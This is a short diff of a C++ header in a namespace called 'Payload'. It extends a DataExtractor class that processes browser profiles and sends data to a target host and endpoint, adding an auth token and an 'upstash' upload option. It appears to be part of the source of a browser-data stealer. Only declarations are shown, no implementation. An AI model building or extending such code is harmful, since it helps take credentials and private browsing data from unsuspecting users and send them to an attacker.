@@ -11,7 +11,7 @@ namespace Payload {
     class DataExtractor {
     public:
         // Match this exactly in your .cpp
-        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint);
+        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint, const std::wstring& authToken = L"", bool upstash = false);
         void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);
 
     private:
@@ -29,8 +29,10 @@ namespace Payload {
 
         PipeClient& m_pipe;
         std::vector<uint8_t> m_key;
-        std::wstring m_targetHost; // Ensure these members exist
+        std::wstring m_targetHost;
         std::wstring m_endpoint;
+        std::wstring m_authToken;
+        bool m_upstash;
         std::vector<std::filesystem::path> m_tempFiles;
     };
 }
